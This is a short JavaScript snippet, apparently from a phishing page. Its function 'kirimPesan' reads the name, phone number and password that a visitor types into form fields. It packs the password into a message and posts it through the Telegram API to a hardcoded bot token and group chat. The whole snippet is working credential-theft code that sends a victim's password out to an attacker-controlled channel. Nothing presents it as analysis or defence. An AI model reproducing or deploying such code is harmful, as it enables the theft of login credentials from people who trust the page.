function kirimPesan() {
    var name = document.getElementById('name');
    var nomorhp = document.getElementById('nomorhp');
    var password = document.getElementById('password');
    
    var gabungan = '%F0%9D%90%83%F0%9D%90%9A%F0%9D%90%AD%F0%9D%90%9A%0A%0APASS%20%3A%20' + password.value;

    var token = '7502188086:AAEr-hPf1vs0wRDiI69OoAbPTDKkMINz_6s';
    var grup = '-1002313585294';

    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
    })
}